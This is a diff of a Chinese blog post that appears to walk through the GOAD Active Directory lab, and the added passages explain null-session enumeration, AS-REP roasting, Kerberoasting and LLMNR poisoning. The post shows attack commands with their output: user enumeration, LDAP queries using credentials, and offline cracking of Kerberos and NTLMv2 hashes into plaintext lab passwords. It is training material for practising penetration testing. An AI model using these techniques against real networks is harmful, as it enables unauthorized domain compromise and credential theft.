@@ -30,7 +30,7 @@
 <meta property="og:image" content="http://example.com/2026/02/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84GOAD%E7%94%9F%E6%B4%BB-%E4%B8%8A/remove_mic.png">
 <meta property="og:image" content="http://example.com/2026/02/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84GOAD%E7%94%9F%E6%B4%BB-%E4%B8%8A/rbcd_after_remove_mic.png">
 <meta property="article:published_time" content="2026-02-01T06:23:40.000Z">
-<meta property="article:modified_time" content="2026-02-01T11:39:23.552Z">
+<meta property="article:modified_time" content="2026-02-01T12:56:14.758Z">
 <meta property="article:author" content="Skyarrow">
 <meta property="article:tag" content="GOAD">
 <meta name="twitter:card" content="summary_large_image">
@@ -241,7 +241,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5.7k words
+          6.5k words
         
       </span>
     
@@ -252,7 +252,7 @@
         
         
         
-          48 mins
+          54 mins
         
       </span>
     
@@ -323,6 +323,15 @@
 <p>决定先打临冬城。</p>
 <p>Winterfell 域控制器允许匿名连接</p>
 <p>用空用户&#x2F;空密码进行用户枚举。</p>
+<blockquote>
+<p><strong>原理：</strong> SMB 空会话是指使用空的用户名和密码连接 IPC$（进程间通信共享）。在旧版 Windows 或配置不当的环境中，允许空会话列举域用户（RID Cycling）或共享资源。</p>
+<p><strong>知识点：</strong></p>
+<ul>
+<li><strong>IPC$ (Inter-Process Communication):</strong> 用于进程间通信的命名管道。</li>
+<li><strong>RID Cycling:</strong> 攻击工具通过猜测用户 RID（相对标识符，如 500 是 Administrator，1000以后是普通用户），通过 LSA RPC 查询对应的用户名。</li>
+<li><strong>安全策略：</strong> 现在的 Windows Server 默认通常开启 “Network access: Do not allow anonymous enumeration of SAM accounts and shares”，防止此类攻击。GOAD 靶场故意放开了此配置。</li>
+</ul>
+</blockquote>
 <figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dns">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# nxc smb <span class="hljs-number">192.168.10.11</span> -u &quot;&quot; -p &quot;&quot; --users <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       [*] Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                    <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       [+] north.sevenkingdoms.local\: <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       -Username-                    -Last PW Set-       -BadPW- -Description-                                <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       Guest                         &lt;never&gt;             <span class="hljs-number">0</span>       Built-in account for guest access to the computer/domain                                                                                                                                                <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       arya.stark                    <span class="hljs-number">2026-01-30</span> <span class="hljs-number">05:15:37 0</span>       Arya Stark <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       sansa.stark                   <span class="hljs-number">2026-01-30</span> <span class="hljs-number">05:15:47 0</span>       Sansa Stark <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       brandon.stark                 <span class="hljs-number">2026-01-30</span> <span class="hljs-number">05:15:50 0</span>       Brandon Stark <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       rickon.stark                  <span class="hljs-number">2026-01-30</span> <span class="hljs-number">05:15:52 0</span>       Rickon Stark <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       hodor                         <span class="hljs-number">2026-01-30</span> <span class="hljs-number">05:15:54 0</span>       Brainless Giant <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       jon.snow                      <span class="hljs-number">2026-01-30</span> <span class="hljs-number">05:15:56 0</span>       Jon Snow <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       samwell.tarly                 <span class="hljs-number">2026-01-30</span> <span class="hljs-number">05:15:59 0</span>       Samwell Tarly (Password : Heartsbane) <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       jeor.mormont                  <span class="hljs-number">2026-01-30</span> <span class="hljs-number">05:16:01 0</span>       Jeor Mormont <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       sql_svc                       <span class="hljs-number">2026-01-30</span> <span class="hljs-number">05:16:03 0</span>       sql service <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       [*] Enumerated <span class="hljs-number">10</span> local users: NORTH<br><br></code></pre></td></tr></table></figure>
 
 <p>我们得到了很多用户名，以及一组登录凭据（山姆威尔·塔利将他的密码写在了备注里）</p>
@@ -333,6 +342,10 @@
 <p>那么我们还可以使用AS-REP Roasting</p>
 <blockquote>
 <p><em>AS</em>-<em>REP</em> Roasting 是一种攻击类型，旨在寻找<strong>未为用户设置 Kerberos预身份验证标志的帐户</strong>。一旦发现，黑客工具可用于暴力破解用户密码。</p>
+<p>Kerberos 认证的第一步是 AS-REQ（认证服务请求）。正常情况下，用户发送 AS-REQ 时，需要用自己的密码哈希加密一个时间戳（预认证，Pre-Authentication），以证明自己知道密码。</p>
+<p>如果某个用户账号设置了 <strong>“Do not require Kerberos preauthentication” (UF_DONT_REQUIRE_PREAUTH)</strong> 属性，攻击者可以<strong>伪装成该用户</strong>向域控发送请求，而无需提供密码。</p>
+<p>域控（KDC）会直接返回 AS-REP，其中包含<strong>用该用户密码哈希加密的 TGT（票据授权票据）部分</strong>。</p>
+<p>攻击者拿到这段加密数据后，可以在本地离线暴力破解（Offline Cracking），试图解开它。如果解开了，说明猜测的密码是正确的。</p>
 </blockquote>
 <p>先将临冬城列出的用户名制作一份字典。</p>
 <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs arduino">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-meta"># cat users.txt </span><br>sql_svc<br>jeor.mormont<br>samwell.tarly<br>jon.snow<br>hodor<br>rickon.stark<br>brandon.stark<br>sansa.stark<br>robb.stark<br>catelyn.stark<br>eddard.stark<br>arya.stark<br>krbtgt<br>vagrant<br>Guest<br>Administrator<br></code></pre></td></tr></table></figure>
@@ -357,6 +370,11 @@
 <p>我们需要进一步列出用户列表。</p>
 <p>由于域信任之间的关系，我们可以查询其他域中的用户。</p>
 <p>使用ladp查询</p>
+<blockquote>
+<p><strong>原理：</strong> 域内的普通用户（Domain User）默认拥有对 Active Directory（AD）数据库极高的读取权限（Read Access）。只要有一个有效账号，攻击者就可以导出几乎整个域的结构、用户、组、计算机和部分属性信息。</p>
+<p><strong>工具知识：</strong> <code>ldapsearch</code> 是与 AD 交互的原生方式。</p>
+<p><strong>攻击逻辑：</strong> 利用初始的一个低权限账号，扩充用户名字典，为后续攻击寻找高价值目标（如域管、服务账号）。</p>
+</blockquote>
 <figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kaada)-<span class="hljs-selector-attr">[/home/kali/Desktop]</span><br>└─# ldapsearch -H ldap://<span class="hljs-number">192.168</span>.<span class="hljs-number">10.10</span> -D <span class="hljs-string">&quot;brandon.stark@north.sevenkingdoms.local&quot;</span> -w iseedeadpeople -b <span class="hljs-string">&quot;DC=sevenkingdoms,DC=local&quot;</span> <span class="hljs-string">&quot;(&amp;(objectCategory=person)(objectClass=user))&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p><img src="/2026/02/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84GOAD%E7%94%9F%E6%B4%BB-%E4%B8%8A/vmware_uAVri521nE.png" srcset="/img/loading.gif" lazyload></p>
@@ -370,6 +388,19 @@
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# john roast.txt <span class="hljs-comment">--wordlist=rockyou.txt </span><br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">3</span> <span class="hljs-keyword">password</span> hashes <span class="hljs-keyword">with</span> <span class="hljs-number">3</span> different salts (krb5tgs, Kerberos <span class="hljs-number">5</span> TGS etype <span class="hljs-number">23</span> [MD4 HMAC-MD5 RC4])<br>Will run <span class="hljs-number">4</span> OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> <span class="hljs-keyword">or</span> Ctrl-C <span class="hljs-keyword">to</span> <span class="hljs-keyword">abort</span>, almost <span class="hljs-keyword">any</span> other key <span class="hljs-keyword">for</span> status<br>iknownothing     (?)     <br><span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span> DONE (<span class="hljs-number">2026</span><span class="hljs-number">-02</span><span class="hljs-number">-01</span> <span class="hljs-number">02</span>:<span class="hljs-number">45</span>) <span class="hljs-number">0.08271</span>g/s <span class="hljs-number">1186</span>Kp/s <span class="hljs-number">2987</span>Kc/s <span class="hljs-number">2987</span>KC/s !!<span class="hljs-number">12</span>Honey..*<span class="hljs-number">7</span>¡Vamos!<br>Use the &quot;--show&quot; <span class="hljs-keyword">option</span> <span class="hljs-keyword">to</span> display <span class="hljs-keyword">all</span> <span class="hljs-keyword">of</span> the cracked passwords reliably<br><span class="hljs-keyword">Session</span> completed. <br><br></code></pre></td></tr></table></figure>
 
 <p>经过测试，此为jon.snow的密码。</p>
+<blockquote>
+<ul>
+<li>在 Kerberos 协议中，用户要访问某个服务（如 SQL Server, IIS），需要向 KDC 申请 TGS（服务票据）。</li>
+<li>KDC 签发的 TGS 票据是使用<strong>运行该服务账号的 NTLM 哈希</strong>加密的。</li>
+<li><strong>漏洞点：</strong> 任何有效的域用户都可以向 KDC 请求<strong>任何</strong>服务的 TGS 票据，无论他是否有权访问该服务。</li>
+<li>攻击者请求到票据后，将其带回本地，进行离线暴力破解。如果破解成功，就拿到了该服务账号的明文密码。</li>
+</ul>
+<p><strong>知识点：</strong></p>
+<ul>
+<li><strong>SPN (Service Principal Name):</strong> 服务主体名称，是 Kerberos 识别服务的唯一标识（如 <code>MSSQLSvc/server.local</code>）。</li>
+<li><strong>高价值目标：</strong> 如果服务运行在域管理员（Domain Admin）账号下，破解成功直接导致域沦陷。</li>
+</ul>
+</blockquote>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">jon.<span class="hljs-keyword">sno</span><span class="hljs-variable">w:iknownothing</span><br></code></pre></td></tr></table></figure>
 
 <p>查看jon.snow的权限</p>
@@ -387,6 +418,16 @@
 
 <p>我们获得了罗柏·史塔克和艾德·史塔克的哈希，使用john破解。</p>
 <p>只能破解出来罗柏的。</p>
+<blockquote>
+<p><strong>原理：</strong> 利用 Windows 的名称解析顺序缺陷。</p>
+<ol>
+<li>当受害者机器尝试访问一个不存在的主机名（例如手滑输错了 <code>\\server01</code> 输成了 <code>\\serber01</code>）。</li>
+<li>DNS 解析失败。</li>
+<li>Windows 会向局域网发送 <strong>LLMNR</strong> (Link-Local Multicast Name Resolution) 和 <strong>NBT-NS</strong> (NetBIOS Name Service) 广播，询问“谁知道 serber01 的IP？”。</li>
+<li><strong>Responder</strong>（攻击者）监听到广播后，立刻伪造响应：“我是 serber01，我的IP是 [攻击机IP]”。</li>
+<li>受害者相信了，并向攻击机发起 SMB 认证连接，发送自己的用户名和 <strong>NTLMv2 Hash</strong>（加密的凭据）。</li>
+</ol>
+</blockquote>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# john hash.txt <span class="hljs-comment">--wordlist=rockyou.txt </span><br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">2</span> <span class="hljs-keyword">password</span> hashes <span class="hljs-keyword">with</span> <span class="hljs-number">2</span> different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 <span class="hljs-number">32</span>/<span class="hljs-number">64</span>])<br>Will run <span class="hljs-number">4</span> OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> <span class="hljs-keyword">or</span> Ctrl-C <span class="hljs-keyword">to</span> <span class="hljs-keyword">abort</span>, almost <span class="hljs-keyword">any</span> other key <span class="hljs-keyword">for</span> status<br>sexywolfy        (robb.stark)     <br><span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">04</span> DONE (<span class="hljs-number">2026</span><span class="hljs-number">-02</span><span class="hljs-number">-01</span> <span class="hljs-number">03</span>:<span class="hljs-number">02</span>) <span class="hljs-number">0.2070</span>g/s <span class="hljs-number">2969</span>Kp/s <span class="hljs-number">3238</span>Kc/s <span class="hljs-number">3238</span>KC/s !)(OPPQR..*<span class="hljs-number">7</span>¡Vamos!<br>Use the &quot;--show --format=netntlmv2&quot; <span class="hljs-keyword">options</span> <span class="hljs-keyword">to</span> display <span class="hljs-keyword">all</span> <span class="hljs-keyword">of</span> the cracked passwords reliably<br><span class="hljs-keyword">Session</span> completed. <br></code></pre></td></tr></table></figure>
 
 <p>接下来使用ntlm中继攻击</p>
